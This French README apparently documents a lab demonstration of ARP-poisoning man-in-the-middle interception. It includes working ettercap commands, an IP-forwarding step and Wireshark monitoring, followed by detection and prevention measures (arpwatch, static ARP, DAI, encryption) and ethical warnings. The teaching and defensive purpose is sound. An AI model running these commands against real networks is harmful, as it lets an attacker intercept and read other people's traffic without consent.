# 🔍 Attaque MITM par ARP Poisoning

> Démonstration d'une attaque Man-in-the-Middle dans un environnement contrôlé

## 📋 Aperçu
Ce projet démontre une attaque **Man-in-the-Middle (MITM)** via **empoisonnement ARP** pour intercepter et analyser le trafic réseau entre une victime et sa passerelle.

## 🎯 Objectifs
- Comprendre la vulnérabilité ARP
- Exécuter une attaque MITM contrôlée
- Identifier les mécanismes de protection

## 🖥️ Configuration
```bash
# Victime:       192.168.1.10  (Ubuntu 22.04)
# Attaquant:     192.168.1.20  (Ubuntu + outils)
# Routeur:       192.168.1.1   (Passerelle)
🛠️ Installation
sudo apt update && sudo apt install ettercap-graphical wireshark arpwatch
echo 1 > /proc/sys/net/ipv4/ip_forward
⚡ Attaque Rapide
bash
# Méthode graphique
sudo ettercap -G
# > Hosts > Scan > Hosts list > Target 1: 192.168.1.1 > Target 2: 192.168.1.10
# > Mitm > ARP poisoning > Sniff remote connections

# Méthode CLI
sudo ettercap -T -q -M arp:remote /192.168.1.10/ /192.168.1.1/
📊 Surveillance
bash
# Sur la victime
arp -a                          # Vérifier le cache ARP
wireshark &                     # Analyser le trafic

# Générer du trafic
ping 8.8.8.8
curl http://example.com
✅ Résultats Attendus
Indicateur	État	Signification
Trafic intercepté	✅	Visible dans Ettercap
HTTP lisible	✅	Données non chiffrées
Cache ARP modifié	✅	MAC routeur → MAC attaquant
Redirection	✅	Tout passe par l'attaquant
🛡️ Protection
bash
# Détection
sudo apt install arpwatch
sudo arpwatch -i eth0

# Prévention
arp -s 192.168.1.1 00:11:22:33:44:55  # ARP statique
# Configuration: VLANs, Port Security, DAI, Chiffrement (HTTPS/VPN)
⚠️ Considérations Éthiques
UNIQUEMENT en environnement de test

Jamais sur des réseaux réels sans autorisation

Toujours obtenir une autorisation écrite

Respecter les lois locales

📄 Résumé Technique
Vulnérabilité : ARP n'a pas d'authentification
Impact : Interception complète du trafic
Détection : Surveillance ARP, anomalies MAC
Prévention : ARP statique, DAI, chiffrement

📚 Références
RFC 826 - ARP Protocol

OWASP - ARP Poisoning

Ettercap Documentation

👤 Auteur
Manar Ouberri
